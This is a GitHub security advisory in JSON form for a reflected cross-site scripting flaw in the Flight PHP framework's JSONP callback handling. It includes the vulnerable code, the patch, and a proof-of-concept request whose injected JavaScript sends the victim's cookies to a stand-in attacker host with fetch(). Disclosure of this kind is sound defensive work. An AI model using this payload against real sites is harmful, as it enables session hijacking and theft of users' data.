{"credits": [{"type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/91620858?v=4", "events_url": "https://api.github.com/users/Rootingg/events{/privacy}", "followers_url": "https://api.github.com/users/Rootingg/followers", "following_url": "https://api.github.com/users/Rootingg/following{/other_user}", "gists_url": "https://api.github.com/users/Rootingg/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/Rootingg", "id": 91620858, "login": "Rootingg", "node_id": "U_kgDOBXYF-g", "organizations_url": "https://api.github.com/users/Rootingg/orgs", "received_events_url": "https://api.github.com/users/Rootingg/received_events", "repos_url": "https://api.github.com/users/Rootingg/repos", "site_admin": false, "starred_url": "https://api.github.com/users/Rootingg/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Rootingg/subscriptions", "type": "User", "url": "https://api.github.com/users/Rootingg", "user_view_type": "public"}}], "cve_id": "CVE-2026-42548", "cvss": {"score": null, "vector_string": null}, "cvss_severities": {"cvss_v3": {"score": 0.0, "vector_string": null}, "cvss_v4": {"score": 8.6, "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N"}}, "cwes": [{"cwe_id": "CWE-79", "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"}], "description": "### Summary
`Flight::jsonp()` concatenates the `?jsonp=` query parameter directly into an `application/javascript` response body without validating that the value is a legal JavaScript identifier. An attacker can inject arbitrary JavaScript that executes in the response origin, enabling reflected cross-site scripting.

### Affected code
`flight/Engine.php` (≈ lines 1000-1013):

```php
$callback = $this->request()->query[$param];
$this->response()
    ->status($code)
    ->header('Content-Type', 'application/javascript; charset=' . $charset)
    ->write($callback . '(' . $json . ');');
```

No regex or identifier validation is performed before the callback is written.

### Proof of concept
Given any route that calls `Flight::jsonp($data)`:

```
GET /api?jsonp=;window.xss=function(d){fetch('https://attacker.tld/c='+d)};xss(document.cookie);//
```

Reproduced response (`Content-Type: application/javascript`):

```
;window.xss=function(d){fetch('https://attacker.tld/c='+d)};xss(document.cookie);//({"ok":true,"msg":"hello"});
```

When the vulnerable endpoint is loaded via `<script src="https://victim.tld/api?jsonp=…">` on a page controlled by the attacker, the injected JavaScript executes in the `victim.tld` origin whenever that page is embedded or visited in a same-origin context — cookie theft and session hijack follow.

### Impact
- Reflected XSS in any application calling `Flight::jsonp()`.
- Cookie theft / session hijack when JSONP endpoints are referenced from same-origin pages.
- Exfiltration of authenticated API responses.

### Patch (fixed in `3.18.1`, commit `b8dd23a`)
`_jsonp()` now validates the callback name against `^[A-Za-z_$][\w$.]{0,127}$` before emitting it. An empty callback (no `jsonp` parameter) still behaves as before.

### Credit
Discovered by **@Rootingg**.", "epss": {"percentage": 0.00341, "percentile": 0.25782}, "ghsa_id": "GHSA-fcx8-ph5r-mxr4", "github_reviewed_at": "2026-05-06T21:34:15Z", "html_url": "https://github.com/advisories/GHSA-fcx8-ph5r-mxr4", "identifiers": [{"type": "GHSA", "value": "GHSA-fcx8-ph5r-mxr4"}, {"type": "CVE", "value": "CVE-2026-42548"}], "nvd_published_at": "2026-05-13T20:16:21Z", "published_at": "2026-05-06T21:34:15Z", "references": ["https://github.com/flightphp/core/security/advisories/GHSA-fcx8-ph5r-mxr4", "https://nvd.nist.gov/vuln/detail/CVE-2026-42548", "https://github.com/advisories/GHSA-fcx8-ph5r-mxr4"], "repository_advisory_url": "https://api.github.com/repos/flightphp/core/security-advisories/GHSA-fcx8-ph5r-mxr4", "severity": "high", "source_code_location": "https://github.com/flightphp/core", "summary": "Flight has reflected XSS through an unvalidated JSONP callback in Flight::jsonp() ", "type": "reviewed", "updated_at": "2026-05-14T20:39:55Z", "url": "https://api.github.com/advisories/GHSA-fcx8-ph5r-mxr4", "vulnerabilities": [{"first_patched_version": "3.18.1", "package": {"ecosystem": "composer", "name": "flightphp/core"}, "vulnerable_functions": [], "vulnerable_version_range": "< 3.18.1"}], "withdrawn_at": null}

title: Flight has reflected XSS through an unvalidated JSONP callback in Flight::jsonp()
